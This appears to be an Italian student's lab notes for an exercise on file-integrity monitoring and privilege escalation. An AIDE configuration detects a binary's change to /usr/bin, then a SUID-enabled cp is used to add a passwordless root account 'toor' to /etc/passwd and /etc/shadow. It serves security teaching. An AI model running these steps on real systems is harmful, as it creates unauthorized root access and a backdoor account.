@@ -1,0 +1,101 @@
+## 9 gennaio 23 monitoraggio e privesc
+
+--obbiettivi:
+Scaricare il file change1 e renderlo eseguibile
+Il comando apporta una modifica a un file dentro /usr/bin
+
+Fase 1:
+ideare un modo di identificare il file modificato e il tipo di modifica apportata.
+lanciare sudo ./change1
+
+Fase 2:
+catturate i comandi seguenti e l'output in uno screenshot privesc.png
+usate come utente kali senza sudo il file modificato dal comando change1, per inserire nei file in /etc/passwd ed /etc/shadow le righe opportune per "creare" un utente di nome toor con privilegi di root e senza password (ricordate che esistono le man page)
+da kali diventate toor e lanciate id
+-------
+
+###### FASE 1 ###################
+
+1) creo una cartella con la mia configurazione
+
+--# mkdir /home/kali/aide
+--# cd /home/kali/aide
+--# nano aide.conf
+-------------------------///////
+# Databases Path
+
+database=file:/home/kali/aide/aide.db
+database_out=file:/home/kali/aide/aide.db.new
+database_new=file:/home/kali/aide/aide.db.new
+
+# Set your own AIDE rule
+
+RULE=R+rmd160+sha256
+
+# Direc/files to monitor with rules
+
+/usr/bin RULE
+
+# Dir to ignore
+!/bin
+!/boot
+!/dev
+!/etc
+!/home
+!/lib
+!/lib64
+!/media
+!/mnt
+!/opt
+!/proc
+!/root
+!/run
+!/sbin
+!/srv
+!/sys
+!/tmp
+!/var
+-------------------------///////
+
+
+2) reinizializzo il database con la nuova configurazione
+
+--# aide -c /home/kali/aide/aide.conf -i
+[nel caso in cui mancasse il db e andasse creato:
+--# sudo aide --init 
+E nel caso in cui non trova in automatico il file di configurazione creato prima
+--# sudo aide --init --config=/home/kali/aide/aide.config
+]
+--# cp /home/kali/aide.db{.new,}
+
+3) lancio il comando e poi il confronto con aide
+--# sudo ./change1
+--# aide -c /home/kali/aide/aide.conf -C
+
+
+######## FASE 2 ############################
+
+Il bit SUID è settato sul comando cp
+
+	mkdir /tmp
+
+	cp /etc/passwd /tmp/passwd
+	cp /ect/shadow /tmp/shadow
+
+[nota: di norma senza SUID servirebbe per questi file: sudo cp]
+
+	echo "toor:x:0:0::/root:/bin/bash" >> /tmp/passwd
+	
+[nome:passwd:UID:GID:descrizione:DIR_HOME:shell]
+NB: nel caso il comando non funzionasse per colpa dei permessi: andare sulla directory /tmp e fare il comando: sudo chmod 777 passwd (farlo anche per shadow e poi riprovare)
+
+	echo "toor::19509:0:99999:7:::" >> /tmp/shadow
+
+[nome:passwd:ultimoCambioPasswd:minimoGiorniCambioPasswd:gvaliditàPasswd:avvisioCambioPasswd:::]
+
+	cp /tmp/passwd /etc/passwd
+	cp /tmp/shadow /etc/shadow
+
+	su toor
+	# id
+
